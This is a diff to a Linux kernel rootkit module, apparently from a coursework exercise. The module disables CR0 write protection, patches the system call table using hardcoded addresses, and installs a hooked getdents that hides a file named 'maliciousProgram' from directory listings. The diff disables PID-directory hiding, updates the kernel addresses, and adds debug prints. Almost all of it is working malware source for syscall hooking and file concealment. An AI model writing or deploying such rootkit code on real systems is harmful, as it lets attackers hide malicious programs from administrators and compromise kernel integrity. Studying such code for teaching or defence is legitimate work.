@@ -12,8 +12,8 @@
 #include <linux/string.h>
 #define BUFFLEN 256
 
-static char *sn_pid = "blah";
-module_param(sn_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+//static char *sn_pid = "blah";
+//module_param(sn_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 
 /*
  * New, all-improved, singing, dancing, iBCS2-compliant getdents()
@@ -62,13 +62,13 @@ write_cr0 (read_cr0 () | 0x10000);*/
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-3.13.0.77-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xc1068be0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xc1069bc0;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xc104ff60;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xc104ff00;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-`$(uname -r)`/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above: find sys_call_table).
-static unsigned long *sys_call_table = (unsigned long *)0xc189f1a0;
+static unsigned long *sys_call_table = (unsigned long *)0xc167d140;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
@@ -104,8 +104,8 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, u
     {
         d = (struct linux_dirent *)((char *)dirp + bpos);
         d_type = *((char *)dirp + bpos + (int)d->d_reclen - 1);
-        if (((d_type == DT_REG) && (strcmp(d->d_name, "maliciousProgram") == 0)) ||
-            ((d_type == DT_DIR) && (strcmp(d->d_name, sn_pid) == 0)))
+        if (((d_type == DT_REG) && (strcmp(d->d_name, "maliciousProgram") == 0))) //||
+            //((d_type == DT_DIR) && (strcmp(d->d_name, sn_pid) == 0)))
         {
             memmove(d, (char *)d + (int)d->d_reclen, nread - bpos - (int)d->d_reclen);
             nread -= (int)d->d_reclen;
@@ -209,9 +209,11 @@ static int rootkit_init(void)
     //See /var/log/syslog for kernel print output
     printk(KERN_INFO "12:42:rootkit being loaded.\n");
 
+    printk(KERN_INFO "cr0:%p", read_cr0());
     //Turn off write protection mode
     write_cr0(read_cr0() & (~0x10000)); //how ???
 
+    printk(KERN_INFO "cr0:%p", read_cr0());
     //Get a pointer to the virtual page containing the address
     //of the system call table in the kernel.
     page_ptr = virt_to_page(&sys_call_table);
@@ -236,7 +238,7 @@ static int rootkit_init(void)
     //Revert page to read-only
     pages_ro(page_ptr, 1);
     //Turn write protection mode back on
-    //write_cr0(read_cr0() | 0x10000);
+    write_cr0(read_cr0() | 0x10000);
 
     return 0; // to show a successful load
 }
